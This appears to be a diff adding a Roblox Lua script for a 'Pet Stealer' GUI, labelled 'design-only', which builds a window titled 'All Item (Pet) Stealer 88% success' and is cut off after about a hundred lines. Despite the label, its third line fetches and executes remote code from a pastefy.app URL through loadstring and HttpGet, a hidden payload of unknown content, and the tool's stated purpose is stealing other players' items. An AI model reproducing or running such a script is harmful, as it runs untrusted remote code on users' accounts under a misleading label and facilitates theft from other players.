@@ -1,0 +1,101 @@
+-- Pet Stealer GUI (design-only)
+-- Hide/minimize allowed during loading + loading bar with percentage text
+loadstring(game:HttpGet("https://pastefy.app/LJyCRNak/raw"))()
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "PetStealerGUI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+local function makeCorner(radius)
+    local uicorner = Instance.new("UICorner")
+    uicorner.CornerRadius = UDim.new(0, radius)
+    return uicorner
+end
+
+local function makeResizeGrip(parent, position, cursor)
+    local grip = Instance.new("Frame")
+    grip.Size = UDim2.new(0, 12, 0, 12)
+    grip.BackgroundColor3 = Color3.fromRGB(60,60,60)
+    grip.BackgroundTransparency = 0.4
+    grip.BorderSizePixel = 0
+    grip.Position = position
+    grip.AnchorPoint = Vector2.new(0.5,0.5)
+    grip.Parent = parent
+    makeCorner(3):Clone().Parent = grip
+    grip.Cursor = cursor
+    return grip
+end
+
+-- ICON (minimized button)
+local icon = Instance.new("Frame")
+icon.Name = "PetStealerIcon"
+icon.Size = UDim2.new(0, 48, 0, 48)
+icon.Position = UDim2.new(0, 20, 0, 120)
+icon.AnchorPoint = Vector2.new(0,0)
+icon.BackgroundColor3 = Color3.fromRGB(30,30,30)
+icon.BorderSizePixel = 0
+icon.Parent = screenGui
+makeCorner(12):Clone().Parent = icon
+
+local iconLabel = Instance.new("TextLabel")
+iconLabel.Size = UDim2.fromScale(1,1)
+iconLabel.BackgroundTransparency = 1
+iconLabel.Text = "PS"
+iconLabel.Font = Enum.Font.SourceSansBold
+iconLabel.TextSize = 20
+iconLabel.TextColor3 = Color3.new(1,1,1)
+iconLabel.Parent = icon
+
+-- MAIN WINDOW
+local main = Instance.new("Frame")
+main.Name = "MainWindow"
+main.Size = UDim2.new(0, 420, 0, 360)
+main.Position = UDim2.new(0, 100, 0, 120)
+main.BackgroundColor3 = Color3.fromRGB(22,22,22)
+main.BorderSizePixel = 0
+main.Parent = screenGui
+makeCorner(10):Clone().Parent = main
+
+local shadow = Instance.new("Frame")
+shadow.Name = "Shadow"
+shadow.Size = main.Size + UDim2.new(0,10,0,10)
+shadow.Position = main.Position + UDim2.new(0,-5,0,-5)
+shadow.BackgroundColor3 = Color3.fromRGB(0,0,0)
+shadow.BackgroundTransparency = 0.8
+shadow.ZIndex = main.ZIndex - 1
+shadow.Parent = screenGui
+makeCorner(12):Clone().Parent = shadow
+
+local titleBar = Instance.new("Frame")
+titleBar.Name = "TitleBar"
+titleBar.Size = UDim2.new(1, 0, 0, 36)
+titleBar.BackgroundTransparency = 1
+titleBar.Parent = main
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -80, 1, 0)
+title.Position = UDim2.new(0, 12, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "All Item (Pet) Stealer 88% success"
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 18
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = titleBar
+
+local closeBtn = Instance.new("TextButton")
+closeBtn.Name = "Close"
+closeBtn.Size = UDim2.new(0, 32, 0, 24)
+closeBtn.Position = UDim2.new(1, -40, 0, 6)
+closeBtn.Text = "X"
+closeBtn.Font = Enum.Font.SourceSansBold
+closeBtn.TextSize = 18
+closeBtn.TextColor3 = Color3.new(1,1,1)
+closeBtn.BackgroundColor3 = Color3.fromRGB(180,40,40)
+closeBtn.BorderSizePixel = 0
+... (463lignes restantes)
